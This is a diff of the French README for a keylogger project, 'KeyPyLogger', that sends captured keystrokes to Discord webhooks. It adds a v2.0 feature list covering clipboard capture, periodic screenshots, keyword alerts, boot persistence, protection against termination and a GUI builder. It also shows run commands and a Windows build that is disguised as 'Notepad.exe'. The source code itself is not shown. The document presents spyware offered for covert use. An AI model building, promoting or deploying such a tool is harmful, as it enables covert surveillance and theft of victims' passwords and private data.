@@ -81,6 +81,7 @@ Pour plus de détails, voir [QUICK_START.md](QUICK_START.md)
 
 ## 🎯 Fonctionnalités
 
+### Version Basic
 - ✅ **Multi-plateforme** : Windows et Linux
 - ✅ **Intégration Discord** : Envoi via webhooks
 - ✅ **Configuration simple** : Édition directe du code
@@ -89,54 +90,74 @@ Pour plus de détails, voir [QUICK_START.md](QUICK_START.md)
 - ✅ **Informations système** : Collecte automatique
 - ✅ **Envoi périodique** : Intervalle configurable
 
+### Version Advanced (v2.0) 🚀
+- ✅ **Toutes les fonctionnalités Basic** +
+- ✅ **Surveillance du presse-papier** : Capture des données copiées
+- ✅ **Captures d'écran périodiques** : Screenshots automatiques
+- ✅ **Alertes par mots-clés** : Détection de termes sensibles
+- ✅ **Persistence** : Redémarrage automatique au boot
+- ✅ **Auto-protection** : Protection contre la terminaison
+- ✅ **Surveillance de santé** : Monitoring du processus
+- ✅ **Builder avancé** : Interface graphique de configuration
+
+📖 **[Voir la documentation complète des fonctionnalités avancées](ADVANCED_FEATURES.md)**
+
 ---
 
 ## 📁 Structure du Projet
 
 ```
 KeyPyLogger/
-├── README.md                       # Documentation principale
-├── QUICK_START.md                  # Guide de démarrage rapide
-├── requirements.txt                # Dépendances Python
+├── README.md                              # Documentation principale
+├── QUICK_START.md                         # Guide de démarrage rapide
+├── ADVANCED_FEATURES.md                   # Documentation des features avancées
+├── requirements.txt                       # Dépendances Python
 │
 ├── src/
 │   ├── windows/
-│   │   └── keylogger_windows.py   # Keylogger Windows
+│   │   ├── keylogger_windows.py          # Keylogger Windows (Basic)
+│   │   └── keylogger_windows_advanced.py # Keylogger Windows (Advanced v2.0)
 │   └── linux/
-│       └── keylogger_linux.py     # Keylogger Linux
+│       ├── keylogger_linux.py            # Keylogger Linux (Basic)
+│       └── keylogger_linux_advanced.py   # Keylogger Linux (Advanced v2.0)
+│
+├── modules/                               # Modules avancés (v2.0)
+│   ├── clipboard.py                       # Surveillance du presse-papier
+│   ├── screenshot.py                      # Capture d'écran
+│   ├── keyword_alerts.py                  # Système d'alertes par mots-clés
+│   ├── persistence.py                     # Mécanismes de persistence
+│   ├── protection.py                      # Auto-protection
+│   └── watchdog.py                        # Surveillance de santé
 │
 ├── tools/
-│   ├── compile_windows.py         # Compilateur Windows
-│   └── test_webhook.py            # Test de connexion
+│   ├── compile_windows.py                 # Compilateur Windows (Basic)
+│   ├── builder.py                         # Builder simple
+│   ├── builder_advanced.py                # Builder avancé avec GUI
+│   └── test_webhook.py                    # Test de connexion
 │
 └── docs/
-    ├── INSTALLATION.md             # Guide d'installation
-    ├── USAGE.md                    # Guide d'utilisation
-    └── FAQ.md                      # Questions fréquentes
+    ├── INSTALLATION.md                    # Guide d'installation
+    ├── USAGE.md                           # Guide d'utilisation
+    └── FAQ.md                             # Questions fréquentes
 ```
 
 ---
 
 ## 💻 Utilisation
 
-### Windows
+### Version Basic
 
-#### Script Python
+#### Windows
 ```bash
+# Script Python
 python src/windows/keylogger_windows.py
-```
 
-#### Exécutable Compilé
-```bash
-# Compiler
+# Exécutable Compilé
 python tools/compile_windows.py
-
-# Exécuter
-build/dist/Notepad.exe
+# Puis exécuter build/dist/Notepad.exe
 ```
 
-### Linux
-
+#### Linux
 ```bash
 # Avec permissions
 python3 src/linux/keylogger_linux.py
@@ -145,11 +166,30 @@ python3 src/linux/keylogger_linux.py
 sudo python3 src/linux/keylogger_linux.py
 ```
 
+### Version Advanced (v2.0)
+
+#### Windows
+```bash
+# Script Python - Éditer la configuration d'abord
+python src/windows/keylogger_windows_advanced.py
+
+# Builder avec GUI - Recommandé !
+python tools/builder_advanced.py
+```
+
+#### Linux
+```bash
+# Script Python - Éditer la configuration d'abord
+python3 src/linux/keylogger_linux_advanced.py
+```
+
 ### Test de Connexion
 
 ```bash
 python tools/test_webhook.py
 ```
+
+📖 **Pour la configuration détaillée des features avancées, voir [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)**
 
 ---
 
@@ -239,6 +279,7 @@ Distribué sous licence MIT. Voir [LICENSE](LICENSE) pour plus d'informations.
 ## 📚 Documentation
 
 - [QUICK_START.md](QUICK_START.md) - Guide de démarrage rapide
+- [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md) - Documentation des fonctionnalités avancées v2.0
 - [docs/INSTALLATION.md](docs/INSTALLATION.md) - Installation détaillée
 - [docs/USAGE.md](docs/USAGE.md) - Utilisation complète
 - [docs/FAQ.md](docs/FAQ.md) - Questions fréquentes
